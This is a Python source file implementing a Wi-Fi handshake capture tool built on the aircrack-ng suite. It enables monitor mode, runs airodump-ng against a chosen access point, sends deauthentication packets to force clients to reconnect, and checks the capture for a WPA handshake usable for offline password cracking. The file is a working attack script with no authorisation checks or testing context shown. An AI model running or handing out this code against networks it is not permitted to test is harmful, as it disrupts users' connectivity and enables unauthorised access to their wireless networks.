import subprocess
import os
import time

class HandshakeCapture:
    def __init__(self, interface, bssid, channel, output_dir="/tmp"):
        self.interface = interface
        self.bssid = bssid
        self.channel = str(channel)
        self.output_dir = output_dir
        self.output_file = os.path.join(output_dir, f"capture-{bssid.replace(':', '')}")
        self.airodump_proc = None
        self.mon_interface = None

    def enable_monitor_mode(self):
        """Enable monitor mode - CRITICAL FIX"""
        try:
            # Kill interfering processes
            subprocess.run(["airmon-ng", "check", "kill"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            result = subprocess.run(["airmon-ng", "start", self.interface], 
                                  capture_output=True, text=True, check=True)
            
            # Extract monitor interface
            for line in result.stdout.splitlines():
                if "mon" in line:
                    self.mon_interface = line.split()[0]
                    break
            if not self.mon_interface:
                self.mon_interface = f"{self.interface}mon"
            return self.mon_interface
        except Exception as e:
            raise Exception(f"Failed to put interface in monitor mode: {e}")

    def start_capture(self):
        """Start airodump-ng in monitor mode"""
        try:
            mon_iface = self.enable_monitor_mode()
            
            cmd = [
                "airodump-ng",
                "--bssid", self.bssid,
                "--channel", self.channel,
                "--write", self.output_file,
                "--output-format", "cap",
                mon_iface
            ]
            
            self.airodump_proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            time.sleep(3)  # Let airodump start
            return True
        except Exception as e:
            raise Exception(f"Failed to start airodump-ng: {e}")

    def send_deauth(self, count=15):
        """Send deauthentication packets"""
        try:
            time.sleep(2)
            mon_iface = self.mon_interface or f"{self.interface}mon"
            
            cmd = [
                "aireplay-ng",
                "--deauth", str(count),
                "-a", self.bssid,
                mon_iface
            ]
            subprocess.run(cmd, timeout=15, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except Exception as e:
            raise Exception(f"Failed to send deauth: {e}")

    def stop_capture(self):
        """Stop capture and restore interface"""
        if self.airodump_proc:
            self.airodump_proc.terminate()
            try:
                self.airodump_proc.wait(timeout=5)
            except:
                self.airodump_proc.kill()
        
        # Restore managed mode
        try:
            mon_iface = self.mon_interface or f"{self.interface}mon"
            subprocess.run(["airmon-ng", "stop", mon_iface], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["systemctl", "restart", "NetworkManager"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

    def get_cap_file(self):
        return f"{self.output_file}-01.cap"

    def check_handshake(self):
        cap_file = self.get_cap_file()
        if not os.path.exists(cap_file):
            return False
        try:
            result = subprocess.run(["aircrack-ng", cap_file], 
                                  capture_output=True, text=True, timeout=10)
            return "1 handshake" in result.stdout.lower() or "handshake" in result.stdout.lower()
        except:
            return os.path.getsize(cap_file) > 20000